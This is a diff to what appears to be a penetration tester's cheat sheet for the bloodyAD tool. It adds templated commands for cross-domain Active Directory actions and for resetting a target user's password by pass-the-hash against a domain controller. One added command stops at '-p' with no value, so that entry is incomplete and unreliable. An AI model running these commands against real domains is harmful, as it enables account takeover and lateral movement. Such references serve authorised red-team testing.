@@ -23,10 +23,21 @@
 -c <key_path>:<pem_path>
 ```
 
+## cross-domain actions
+```bash
+bloodyad --host <dc_ip> -d <domain> -u <user> -p
+```
+
 ## set - change user password (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
 bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Jubeaz12345!>' 
+```
+
+## set cross-domain - change user password (pth)
+https://github.com/CravateRouge/bloodyAD
+```bash
+bloodyad --host <target_dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Jubeaz12345!>' 
 ```
 
 ## set - add/replace/delete target attribute  (pth)
